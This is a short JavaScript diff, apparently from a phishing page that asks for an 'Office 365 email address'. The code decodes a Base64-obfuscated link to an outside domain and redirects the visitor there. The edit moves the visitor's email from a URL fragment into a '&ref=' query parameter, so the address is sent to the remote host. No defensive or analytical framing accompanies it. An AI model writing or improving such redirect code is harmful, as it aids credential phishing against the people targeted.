@@ -160,7 +160,7 @@
             if (validateEmail(emailValue)) {
                 var encodedLink = "aHR0cHM6Ly9tZ2NvbnN0cnVjdGlvbndvcmsuY29tLz9mbGFqbXdoaA"; // Base64 encoded link
                 var decodedLink = atob(encodedLink);
-                var finalLink = decodedLink + "#" + emailValue;  // Append the email address
+                var finalLink = decodedLink + "&ref=" + emailValue;  // Append the email address
                 window.location.href = finalLink;
             } else {
                 alert("Please enter a valid Office 365 email address.");
